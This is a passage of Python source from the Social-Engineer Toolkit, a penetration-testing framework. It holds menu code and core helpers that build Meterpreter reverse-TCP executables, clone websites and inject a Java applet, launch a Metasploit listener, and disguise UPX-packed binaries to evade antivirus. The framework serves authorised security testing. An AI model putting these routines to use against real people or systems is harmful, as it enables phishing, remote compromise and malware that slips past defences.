                    shutil.copyfile("src/teensy/x10/libraries.zip", setdir + "/reports/arduino_hammer/libraries.zip")
                    print_status("Arduino jammer files and libraries exported to ~/.set/reports/arduino_jammer")
                    return_continue()

                # powershell shellcode injection
                if teensy_menu_choice == "12":
                    print_status("Generating the Powershell - Shellcode injection pde..")
                    debug_msg(me, "importing 'src.teensy.powershell_shellcode'", 1)
                    import src.teensy.powershell_shellcode

            if teensy_menu_choice == "99": teensy_menu_choice = None

        #
        # Main Menu choice 8: Wireless Attack Point Attack Vector
        #
        if main_menu_choice == '8':

            if operating_system == "windows":
                print_warning("Sorry. The wireless attack vector is not yet supported in Windows.")
                return_continue()

            if operating_system != "windows":

                # set path to nothing
                airbase_path = ""
                dnsspoof_path = ""
                # need to pull the SET config file
                fileopen = file("config/set_config", "r")
                for line in fileopen:
                    line = line.rstrip()
                    match = re.search("AIRBASE_NG_PATH=", line)
                    if match:
                        airbase_path = line.replace("AIRBASE_NG_PATH=", "")

                    match1 = re.search("DNSSPOOF_PATH=", line)
                    if match1: dnsspoof_path = line.replace("DNSSPOOF_PATH=", "")

                if not os.path.isfile(airbase_path):
                    if not os.path.isfile("/usr/local/sbin/airbase-ng"):
                        print_warning("Warning airbase-ng was not detected on your system. Using one in SET.")
                        print_warning("If you experience issues, you should install airbase-ng on your system.")
                        print_warning("You can configure it through the set_config and point to airbase-ng.")
                        airbase_path = ("src/wireless/airbase-ng")
                    if os.path.isfile("/usr/local/sbin/airbase-ng"):
                        airbase_path = "/usr/local/sbin/airbase-ng"

                if not os.path.isfile(dnsspoof_path):
                    if os.path.isfile("/usr/local/sbin/dnsspoof"):
                        dnsspoof_path = "/usr/local/sbin/dnsspoof"
                    if os.path.isfile("/usr/sbin/dnsspoof"):
                        dnsspoof_path = "/usr/sbin/dnsspoof"

                # if we can find airbase-ng
                if os.path.isfile(airbase_path):
                    if os.path.isfile(dnsspoof_path):
                        # start the menu here
                        while 1:

                                ###################################################
                                #        USER INPUT: SHOW WIRELESS MENU           #
                                ###################################################
                            debug_msg(me, "printing 'text.wireless_attack_menu'", 5)
                            show_wireless_menu = create_menu(text.wireless_attack_text, text.wireless_attack_menu)
                            wireless_menu_choice = raw_input(setprompt(["8"], ""))
                            # if we want to start access point
                            if wireless_menu_choice == "1":
                                sys.path.append("src/wireless/")
                                debug_msg(me, "importing 'src.wireless.wifiattack'", 1)
                                try:
                                    reload(wifiattack)
                                except:
                                    import wifiattack

                            # if we want to stop the wifi attack
                            if wireless_menu_choice == "2":
                                sys.path.append("src/wireless/")
                                debug_msg(me, "importing 'src.wireless.stop_wifiattack'", 1)
                                try:
                                    reload(stop_wifiattack)
                                except:
                                    import stop_wifiattack

                            # if we want to return to the main menu
                            if wireless_menu_choice == "99":
                                print (" [*] Returning to the main menu ...")
                                break

                if not os.path.isfile(dnsspoof_path):
                    if not os.path.isfile("/usr/local/sbin/dnsspoof"):
                        print_error("ERROR:DNS Spoof was not detected. Check the set_config file.")
                        return_continue()

        #
        # END WIFI ATTACK MODULE
        #


        # Main Menu choice 9: QRCode Generator
        if main_menu_choice == '9':
            try:
                from PIL import Image, ImageDraw
                from src.qrcode.qrgenerator import *
                print """
The QRCode Attack Vector will create a QRCode for you with whatever URL you want.

When you have the QRCode Generated, select an additional attack vector within SET and
deploy the QRCode to your victim. For example, generate a QRCode of the SET Java Applet
and send the QRCode via a mailer.
"""
                url = raw_input("Enter the URL you want the QRCode to go to: ")
                # if the reports directory does not exist then create it
                if not os.path.isdir("%s/reports" % (setdir)):
                    os.makedirs("%s/reports" % (setdir))
                gen_qrcode(url)
                return_continue()

            except ImportError:
                print_error("This module requires python-imaging to work properly.")
                print_error("In Ubuntu do apt-get install python-imaging")
                print_error("Else refer to here for installation: http://code.google.com/appengine/docs/python/images/installingPIL.html")
                return_continue()

        # Main Menu choice 10: PowerShell Attacks
        if main_menu_choice == '10':
            #show_powershell_menu = create_menu(text.powershell_text, text.powershell_menu)
            #powershell_menu_choice = raw_input(setprompt(["1"], ""))
            import src.powershell.powershell

        # Main Menu choice 11: Third Party Modules
        if main_menu_choice == '11':
            sys.path.append("src/core")
            debug_msg(me, "importing 'src.core.module_handler'", 1)
            try:
                reload(module_handler)
            except:
                import module_handler

        # Main Menu choice 99: Exit the Social-Engineer Toolkit
        if main_menu_choice == '99':
            break

        # Main Menu choice 7: SMS Spoofing Attack Vector
        if main_menu_choice == '7':
            sms_menu_choice = '0'
            while sms_menu_choice != '3':

            ###################################################
            #        USER INPUT: SHOW SMS MENU                #
            ###################################################
                debug_msg(me, "printing 'text.sms_attack_text'", 5)
                show_sms_menu = create_menu(text.sms_attack_text, text.sms_attack_menu)
                sms_menu_choice = raw_input(setprompt(["7"], ""))

                if sms_menu_choice == 'exit':
                    exit_set()

                if sms_menu_choice == '1':
                    sys.path.append("src/sms/client/")
                    debug_msg(me, "importing 'src.sms.client.sms_client'", 1)
                    try:
                        reload(sms_client)
                    except:
                        import sms_client

                if sms_menu_choice == '2':
                    sys.path.append("src/sms/client/")
                    debug_msg(me, "importing 'src.sms.client.custom_sms_template'", 1)
                    try:
                        reload(custom_sms_template)
                    except:
                        import custom_sms_template

                if sms_menu_choice == '99': break

# handle keyboard interrupts
except KeyboardInterrupt:
    print "\n\n Thank you for " + bcolors.RED+"shopping" + bcolors.ENDC+" with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n"

########NEW FILE########
__FILENAME__ = setcore
#!/usr/bin/env python
##############################################
#    Centralized core modules for SET        #
##############################################
import re
import sys
import socket
import subprocess
import shutil
import os
import time
import datetime
import random
import string
import inspect
import base64
from src.core import dictionaries
import thread
import cStringIO
import trace

# check to see if we have python-pycrypto
try:
    from Crypto.Cipher import AES

except ImportError:
    print "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications."
    pass

# get the main SET path
def definepath():
    if check_os() == "posix":
        if os.path.isfile("setoolkit"):
            return os.getcwd()
        else:
            return "/usr/share/setoolkit/"

    else:
        return os.getcwd()            

# check operating system
def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system

#
# Class for colors
#
if check_os() == "posix":
    class bcolors:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERL = '\033[4m'
        ENDC = '\033[0m'
        backBlack = '\033[40m'
        backRed = '\033[41m'
        backGreen = '\033[42m'
        backYellow = '\033[43m'
        backBlue = '\033[44m'
        backMagenta = '\033[45m'
        backCyan = '\033[46m'
        backWhite = '\033[47m'

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# if we are windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        BOLD = ''
        UNDERL = ''
        ENDC = ''
        backBlack = ''
        backRed = ''
        backGreen = ''
        backYellow = ''
        backBlue = ''
        backMagenta = ''
        backCyan = ''
        backWhite = ''

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# this will be the home for the set menus
def setprompt(category, text):
    # if no special prompt and no text, return plain prompt
    if category == '0' and text == "":
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "
    # if the loop is here, either category or text was positive
    # if it's the category that is blank...return prompt with only the text
    if category == '0':
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
    # category is NOT blank
    else:
        # initialize the base 'set' prompt
        prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC
        # if there is a category but no text
        if text == "":
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring += ">"
            return promptstring
        # if there is both a category AND text
        else:
            # iterate through the list received
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring = promptstring + "> " + text + ":"
            return promptstring

def yesno_prompt(category,text):
    valid_response = False
    while not valid_response:
        response = raw_input(setprompt(category,text))
        response = str.lower(response)
        if response == "no" or response == "n":
            response = "NO"
            valid_response = True
        elif response == "yes" or response == "y":
            response = "YES"
            valid_response = True
        else:
            print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
    return response

def return_continue():
    print ("\n      Press " + bcolors.RED + "<return> " + bcolors.ENDC + "to continue")
    pause = raw_input()

############ DEBUGGING ###############
#### ALWAYS SET TO ZERO BEFORE COMMIT!
DEBUG_LEVEL = 0
                  #  0 = Debugging OFF
                  #  1 = debug imports only
                  #  2 = debug imports with pause for <ENTER>
                  #  3 = imports, info messages
                  #  4 = imports, info messages with pause for <ENTER>
                  #  5 = imports, info messages, menus
                  #  6 = imports, info messages, menus with pause for <ENTER>

debugFrameString = '-' * 72

def debug_msg(currentModule, message, msgType):
    if DEBUG_LEVEL == 0:
        pass         #stop evaluation efficiently
    else:
        if msgType <= DEBUG_LEVEL:
            # a bit more streamlined
            print bcolors.RED + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + bcolors.ENDC

            if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
                raw_input("waiting for <ENTER>\n")

def mod_name():
    frame_records = inspect.stack()[1]
    calling_module=inspect.getmodulename(frame_records[1])
    return calling_module

##########################################
############ RUNTIME MESSAGES ############
def print_status(message):
    print bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message)

def print_info(message):
    print bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message)

def print_info_spaces(message):
    print bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message)

def print_warning(message):
    print bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message)

def print_error(message):
    print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC

def get_version():
    define_version = '6.0'
    return define_version

class create_menu:
    def __init__(self, text, menu):
        self.text = text
        self.menu = menu
        print text
        for i, option in enumerate(menu):

            menunum = i + 1
            # Check to see if this line has the 'return to main menu' code
            match = re.search("0D", option)
            # If it's not the return to menu line:
            if not match:
                if menunum < 10:
                    print('   %s) %s' % (menunum,option))
                else:
                    print('  %s) %s' % (menunum,option))
            else:
                print '\n  99) Return to Main Menu\n'
        return

def validate_ip(address):
    try:
        if socket.inet_aton(address):
            if len(address.split('.')) == 4:
                debug_msg("setcore","this is a valid IP address",5)
                return True
            else:
                print_error("This is not a valid IP address...")
                raise socket.error
        else:
            raise socket_error

    except socket.error:
        return False

#
# grab the metaspoit path
#
def meta_path():
    # DEFINE METASPLOIT PATH
    msf_path = check_config("METASPLOIT_PATH=")
    if msf_path.endswith("/"): pass
    else: msf_path = msf_path + "/"
    trigger = 0
    if not os.path.isdir(msf_path):
                # specific for kali linux
                if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
                    msf_path = "/opt/metasploit/apps/pro/msf3/"
                    trigger = 1
                # specific for backtrack5
                if os.path.isfile("/opt/framework3/msf3/msfconsole"):
                    msf_path = "/opt/framework3/msf3/"
                    trigger = 1
                if os.path.isfile("/opt/framework/msf3/msfconsole"):
                    msf_path = "/opt/framework/msf3/"
                    trigger = 1
                if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
                    msf_path = "/opt/metasploit/msf3/"
                    trigger = 1
                if os.path.isfile("/usr/bin/msfconsole"):
                    msf_path = ""
                    trigger = 1
                # specific for pwnpad and pwnplug (pwnie express)
                if os.path.isfile("/opt/metasploit-framework/msfconsole"):
                    msf_path = "/opt/metasploit-framework"
                    trigger = 1

                if trigger == 0:
                    if check_os() != "windows":
                        check_metasploit = check_config("METASPLOIT_MODE=").lower()
                        if check_metasploit != "off":
                            print_error("Metasploit path not found. These payloads will be disabled.")
                            print_error("Please configure in the config/set_config.")
                            return_continue()
                            return False
                    if check_os() == "windows":
                        print_warning("Metasploit payloads are not currently supported. This is coming soon.")
                        msf_path = ""

    # this is an option if we don't want to use Metasploit period
    check_metasploit = check_config("METASPLOIT_MODE=").lower()
    if check_metasploit != "on": msf_path = False
    return msf_path

#
# grab the metaspoit path
#
def meta_database():
    # DEFINE METASPLOIT PATH
    meta_path = file("%s/config/set_config" % (definepath()),"r").readlines()
    for line in meta_path:
        line = line.rstrip()
        match = re.search("METASPLOIT_DATABASE=", line)
        if match:
            line = line.replace("METASPLOIT_DATABASE=","")
            msf_database = line.rstrip()
            return msf_database


#
# grab the interface ip address
#
def grab_ipaddress():
    try:
        fileopen = file("%s/config/set_config" % (definepath()), "r").readlines()
        for line in fileopen:
            line = line.rstrip()
            match = re.search("AUTO_DETECT=ON", line)
            if match:
                try:
                    rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    rhost.connect(('google.com', 0))
                    rhost.settimeout(2)
                    rhost = rhost.getsockname()[0]
                    return rhost
                except Exception:
                    rhost = raw_input(setprompt("0", "Enter your interface IP Address"))
                    while 1:
                        # check if IP address is valid
                        ip_check = is_valid_ip(rhost)
                        if ip_check == False:
                            rhost = raw_input("[!] Invalid ip address try again: ")
                        if ip_check == True: break
                    return rhost
    
        # if AUTO_DETECT=OFF prompt for IP Address
            match1 = re.search("AUTO_DETECT=OFF", line)
            if match1:
                rhost = raw_input(setprompt("0", "IP address for the payload listener"))
                while 1:
                        # check if IP address is valid
                    ip_check = is_valid_ip(rhost)
                    if ip_check == False:
                        rhost = raw_input("[!] Invalid ip address try again: ")
                    if ip_check == True: break
                return rhost

    except Exception, e:
        print_error("ERROR:Something went wrong:")
        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


#
# cleanup old or stale files
#
def cleanup_routine():
    try:
        # restore original Java Applet
        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath()), setdir + "/Signed_Update.jar")
        if os.path.isfile("newcert.pem"):
            os.remove("newcert.pem")
        if os.path.isfile(setdir + "/interfaces"):
            os.remove(setdir + "/interfaces")
        if os.path.isfile("src/html/1msf.raw"):
            os.remove("src/html/1msf.raw")
        if os.path.isfile("src/html/2msf.raw"):
            os.remove("src/html/2msf.raw")
        if os.path.isfile("msf.exe"):
            os.remove("msf.exe")
        if os.path.isfile("src/html/index.html"):
            os.remove("src/html/index.html")
        if os.path.isfile(setdir + "/Signed_Update.jar"):
            os.remove(setdir + "/Signed_Update.jar")

    except:
        pass

# quick check to see if we are running kali-linux
def check_kali():
    if os.path.isfile("/etc/apt/sources.list"):
        kali = file("/etc/apt/sources.list", "r")
        kalidata = kali.read()
        if "kali" in kalidata:
            return "Kali"
        # if we aren't running kali
        else: return "Non-Kali"
    else:
        print "[!] Not running a Debian variant.."
        return "Non-Kali"

# checking if we have bleeding-edge enabled for updates
def bleeding_edge():
    # first check if we are actually using Kali
    kali = check_kali()
    if kali == "Kali":
        print_status("Checking to see if bleeding-edge repos are active.")
        # check if we have the repos enabled first
        fileopen = file("/etc/apt/sources.list", "r")
        kalidata = fileopen.read()
        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
            print_status("Bleeding edge already active..Moving on..")
            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
            return True
        else:
            print_status("Adding Kali bleeding edge to sources.list for updates.")
            # we need to add repo to kali file
            # we will rewrite the entire apt in case not all repos are there
            filewrite = file("/etc/apt/sources.list", "w")
            filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
            filewrite.close()
            print_status("Updating Kali now...")
            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
            return True

    else:
        print "[!] Kali was not detected. Not adding bleeding edge repos."
        return False

#
# Update The Social-Engineer Toolkit
#
def update_set():
    kali = check_kali()
    if kali == "Kali":
        print_status("You are running Kali Linux which maintains SET updates.")
        print_status("You can enable bleeding-edge repos for up-to-date SET.")
        time.sleep(2)
        bleeding_edge()

    else:
        peinr_info("Kali-Linux not detected, manually updating..")
        print_info("Updating the Social-Engineer Toolkit, be patient...")
        print_info("Performing cleanup first...")
        subprocess.Popen("git clean -fd", shell=True).wait()
        print_info("Updating... This could take a little bit...")
        subprocess.Popen("git pull", shell=True).wait()
        print_status("The updating has finished, returning to main menu..")
        time.sleep(2)

#
# Pull the help menu here
#
def help_menu():
    fileopen = file("README.md", "r").readlines()
    for line in fileopen:
        line = line.rstrip()
        print line
    fileopen = file("readme/CREDITS", "r").readlines()
    print "\n"
    for line in fileopen:
        line = line.rstrip()
        print line
    return_continue()


#
# This is a small area to generate the date and time
#
def date_time():
    now = str(datetime.datetime.today())
    return now

#
# generate a random string
#
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])

#
# clone JUST a website, and export it.
# Will do no additional attacks.
#
def site_cloner(website, exportpath, *args):
    grab_ipaddress()
    ipaddr = grab_ipaddress()
    filewrite = file(setdir + "/interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file(setdir + "/ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file(setdir + "/site.template", "w")
    filewrite.write("URL=" + website)
    filewrite.close()
    # if we specify a second argument this means we want to use java applet
    if args[0] == "java":
        # needed to define attack vector
        filewrite = file(setdir + "/attack_vector", "w")
        filewrite.write("java")
        filewrite.close()
    sys.path.append("src/webattack/web_clone")
    # if we are using menu mode we reload just in case
    try:
        debug_msg("setcore","importing 'src.webattack.web_clone.cloner'",1)
        reload(cloner)

    except:
        debug_msg("setcore","importing 'src.webattack.web_clone.cloner'",1)
        import cloner

    # copy the file to a new folder
    print_status("Site has been successfully cloned and is: " + exportpath)
    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, setdir, exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

#
# this will generate a meterpreter reverse payload (executable)
# with backdoored executable, digital signature stealing, and
# UPX encoded (if these options are enabled). It will automatically
# inherit the AUTO_DETECT=ON or OFF configuration.
#
# usage: metasploit_reverse_tcp_exe(portnumber)
#
def meterpreter_reverse_tcp_exe(port):

    ipaddr = grab_ipaddress()
    filewrite = file(setdir + "/interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file(setdir + "/ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    update_options("IPADDR=" + ipaddr)

    # trigger a flag to be checked in payloadgen
    # if this flag is true, it will skip the questions
    filewrite = file(setdir + "/meterpreter_reverse_tcp_exe", "w")
    filewrite.write(port)
    filewrite.close()
    # import the system path for payloadgen in SET
    sys.path.append("src/core/payloadgen")
    try:
        debug_msg("setcore","importing 'src.core.payloadgen.create_payloads'",1)
        reload(create_payloads)

    except:
        debug_msg("setcore","importing 'src.core.payloadgen.create_payloads'",1)
        import create_payloads

    random_value = generate_random_string(5, 10)
    # copy the created executable to program_junk
    print_status("Executable created under %s/%s.exe" % (setdir,random_value))
    subprocess.Popen("cp %s/msf.exe %s/%s.exe" % (setdir,setdir,random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
#
# Start a metasploit multi handler
#
def metasploit_listener_start(payload,port):
    # open a file for writing
    filewrite = file(setdir + "/msf_answerfile", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload, port))
    # close the file
    filewrite.close()
    # launch msfconsole
    metasploit_path = meta_path()
    subprocess.Popen("%s/msfconsole -r %s/msf_answerfile" % (metasploit_path, setdir), shell=True).wait()

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import SocketServer, SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        thread.start_new_thread(httpd.serve_forever, ())

    # handle keyboard interrupts
    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()

#
# this will start a web server without threads
#
def start_web_server_unthreaded(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import thread, SocketServer, SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        httpd.serve_forever()
        # change directory to the path we specify for output path
        os.chdir(directory)
        # handle keyboard interrupts

    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()


#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack(website, port, directory):
    # create the payload
    meterpreter_reverse_tcp_exe(port)
    # clone the website and inject java applet
    site_cloner(website,directory,"java")

    # this part is needed to rename the msf.exe file to a randomly generated one
    filename = check_options("MSF.EXE=")
    if check_options != 0:

        # move the file to the specified directory and filename
        subprocess.Popen("cp %s/msf.exe %s/%s" % (setdir,directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # lastly we need to copy over the signed applet
    subprocess.Popen("cp %s/Signed_Update.jar %s" % (setdir,directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # start the web server by running it in the background
    start_web_server(directory)

    # run multi handler for metasploit
    print_info("Starting the multi/handler through Metasploit...")
    metasploit_listener_start("windows/meterpreter/reverse_tcp",port)

#
# this will create a raw PDE file for you to use in your teensy device
#
#
def teensy_pde_generator(attack_method):

    # grab the ipaddress
    ipaddr=grab_ipaddress()

    # if we are doing the attack vector teensy beef
    if attack_method == "beef":
        # specify the filename
        filename = file("src/teensy/beef.pde", "r")
        filewrite = file(setdir + "/reports/beef.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.pde" % (setdir))

    # if we are doing the attack vector teensy beef
    if attack_method == "powershell_down":
        # specify the filename
        filename = file("src/teensy/powershell_down.pde", "r")
        filewrite = file(setdir + "/reports/powershell_down.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.pde" % (setdir))

    # if we are doing the attack vector teensy
    if attack_method == "powershell_reverse":
        # specify the filename
        filename = file("src/teensy/powershell_reverse.pde", "r")
        filewrite = file(setdir + "/reports/powershell_reverse.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.pde" % (setdir))

    # if we are doing the attack vector teensy beef
    if attack_method == "java_applet":
        # specify the filename
        filename = file("src/teensy/java_applet.pde", "r")
        filewrite = file(setdir + "/reports/java_applet.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.pde" % (setdir))

    # if we are doing the attack vector teensy
    if attack_method == "wscript":
        # specify the filename
        filename = file("src/teensy/wscript.pde", "r")
        filewrite = file(setdir + "/reports/wscript.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/wscript.pde" % (setdir))

    # All the options share this code except binary2teensy
    if attack_method != "binary2teensy":
        for line in filename:
            line = line.rstrip()
            match = re.search("IPADDR", line)
            if match:
                line = line.replace("IPADDR", ipaddr)
            filewrite.write(line)

    # binary2teensy method
    if attack_method == "binary2teensy":
        # specify the filename
        import src.teensy.binary2teensy
        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.pde" % (setdir)) 

    print_status(teensy_string)
#
# Expand the filesystem windows directory
#

def windows_root():
    return os.environ['WINDIR']

#
# core log file routine for SET
#
def log(error):
        # open log file only if directory is present (may be out of directory for some reason)
    if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "w")
        filewrite.write("")
        filewrite.close()
    if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
        error = str(error)
        # open file for writing
        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "a")
        # write error message out
        filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
        # close the file
        filewrite.close()

#
# upx encoding and modify binary
#
def upx(path_to_file):
    # open the set_config
    fileopen = file("config/set_config", "r")
    for line in fileopen:
        line = line.rstrip()
        match = re.search("UPX_PATH=", line)
        if match:
            upx_path = line.replace("UPX_PATH=", "")

    # if it isn't there then bomb out
    if not os.path.isfile(upx_path):
        print_warning("UPX was not detected. Try configuring the set_config again.")

    # if we detect it
    if os.path.isfile(upx_path):
        print_info("Packing the executable and obfuscating PE file randomly, one moment.")
        # packing executable
        subprocess.Popen("%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        # move it over the old file
        subprocess.Popen("mv %s/temp.binary %s" % (setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        # random string
        random_string = generate_random_string(3,3).upper()

        # 4 upx replace - we replace 4 upx open the file
        fileopen = file(path_to_file, "rb")
        filewrite = file(setdir + "/temp.binary", "wb")

        # read the file open for data
        data = fileopen.read()
        # replace UPX stub makes better evasion for A/V
        filewrite.write(data.replace("UPX", random_string, 4))
        filewrite.close()
        # copy the file over
        subprocess.Popen("mv %s/temp.binary %s" % (setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    time.sleep(3)

def show_banner(define_version,graphic):

    if graphic == "1":
        if check_os() == "posix":
            os.system("clear")
        if check_os() == "windows":
            os.system("cls")
        show_graphic()
    else:
        os.system("clear")

    print bcolors.BLUE + """
[---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
[---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
[---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                     [---]
[---]             Codename: '""" + bcolors.YELLOW + """Rebellion""" + bcolors.BLUE + """'                [---]
[---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
[---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
[---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]

""" + bcolors.GREEN+"""        Welcome to the Social-Engineer Toolkit (SET). 
         The one stop shop for all of your SE needs.
"""
    print bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
    print bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC

def show_graphic():
    menu = random.randrange(2,12)
    if menu == 2:
        print bcolors.YELLOW + r"""
                 .--.  .--. .-----.
                : .--': .--'`-. .-'
                `. `. : `;    : :
                 _`, :: :__   : :
                `.__.'`.__.'  :_;   """ + bcolors.ENDC
        return

    if menu == 3:
        print bcolors.GREEN + r"""
          _______________________________
         /   _____/\_   _____/\__    ___/
         \_____  \  |    __)_   |    |
         /        \ |        \  |    |
        /_______  //_______  /  |____|
                \/         \/            """ + bcolors.ENDC
        return

    if menu == 4:
        print bcolors.BLUE + r"""
            :::===  :::===== :::====
            :::     :::      :::====
             =====  ======     ===
                === ===        ===
            ======  ========   ===
""" + bcolors.ENDC

    if menu == 5:
        print bcolors.RED + r"""
           ..######..########.########
           .##....##.##..........##...
           .##.......##..........##...
           ..######..######......##...
           .......##.##..........##...
           .##....##.##..........##...
           ..######..########....##...  """ + bcolors.ENDC
        return

    if menu == 6:
        print bcolors.PURPLE + r'''
         .M"""bgd `7MM"""YMM MMP""MM""YMM
        ,MI    "Y   MM    `7 P'   MM   `7
        `MMb.       MM   d        MM
          `YMMNq.   MMmmMM        MM
